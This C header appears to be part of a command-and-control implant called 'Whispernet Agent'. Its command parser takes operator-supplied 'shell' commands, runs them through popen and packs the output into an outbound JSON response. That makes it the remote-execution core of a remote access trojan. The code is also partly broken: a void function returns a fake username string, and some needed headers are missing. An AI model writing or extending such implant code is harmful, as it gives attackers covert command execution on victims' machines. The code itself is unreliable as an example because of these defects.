#pragma once
#include <stdio.h>
#include "whisper_json.h"

/*
    Baked in commands to Whispernet Agent

    uses things like whisper_winapi to do actions here


    may need to split into .c and .h as well
*/
//void set_response_data(OutboundJsonDataStruct* response_struct, const char* data);

void get_username(OutboundJsonDataStruct* response_struct);
void set_response_data(OutboundJsonDataStruct* response_struct, const char* data);
void execute_shell_command(OutboundJsonDataStruct* response_struct, const char* command);
// ====================
// Functions
// ====================

void set_response_data(OutboundJsonDataStruct* response_struct, const char* data) {
    if (response_struct->command_result_data) {
        free(response_struct->command_result_data);
    }
    
    response_struct->command_result_data = strdup(data); // _strdup dynamically allocates and copies the string
    if (!response_struct->command_result_data) {
        DEBUG_LOG("Memory allocation failed for command_result_data.\n");
    }
}

// later - have a seperate parse tree based on if creds are supplied or not, or
// somethign like that...

int parse_command(char* command, char* args, OutboundJsonDataStruct* response_struct) {
    if (!response_struct) {
        DEBUG_LOG("[!] response_struct is NULL!\n");
        return -1;
    }

    DEBUG_LOG("Struct UUID: %s\n", response_struct->agent_id);
    DEBUG_LOG("Struct command_result_data: %s\n", response_struct->command_result_data);

    if (strcmp(command, "shell") == 0) {
        DEBUG_LOG("[COMMAND] shell\n");
        execute_shell_command(response_struct, args);
    }  
    else if (strcmp(command, "help") == 0) {
        DEBUG_LOG("[COMMAND] help\n");
        set_response_data(response_struct, "Help Menu Placeholder");
    }
    else {
        DEBUG_LOG("[COMMAND] Unknown command!\n");
        set_response_data(response_struct, "Unknown command");
    }
    return 0;
}

// For unix - literally just an os.system or whatever is fine for now, can make scripts around it

void get_username(OutboundJsonDataStruct* response_struct){
    return "FAKEUSERNAME";
}

// Generic function to execute a shell command and capture its output
//not chatGPT'd at all
void execute_shell_command(OutboundJsonDataStruct* response_struct, const char* command) {
    FILE *fp = popen(command, "r");
    if (!fp) {
        DEBUG_LOG("Failed to execute command: %s\n", command);
        set_response_data(response_struct, "Error executing command");
        return;
    }

    // Allocate an initial buffer for the output.
    size_t capacity = 256;
    size_t length = 0;
    char *output = malloc(capacity);
    if (!output) {
        DEBUG_LOG("Memory allocation failed\n");
        pclose(fp);
        set_response_data(response_struct, "Memory allocation failed");
        return;
    }
    output[0] = '\0';

    // Read output from the command
    char buffer[256];
    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        size_t chunk_length = strlen(buffer);
        // Ensure our output buffer is large enough.
        if (length + chunk_length + 1 > capacity) {
            capacity *= 2;
            char *temp = realloc(output, capacity);
            if (!temp) {
                free(output);
                pclose(fp);
                set_response_data(response_struct, "Memory allocation failed");
                return;
            }
            output = temp;
        }
        strcpy(output + length, buffer);
        length += chunk_length;
    }
    pclose(fp);

    DEBUG_LOG("Shell command output: %s\n", output);
    set_response_data(response_struct, output);
    free(output);
}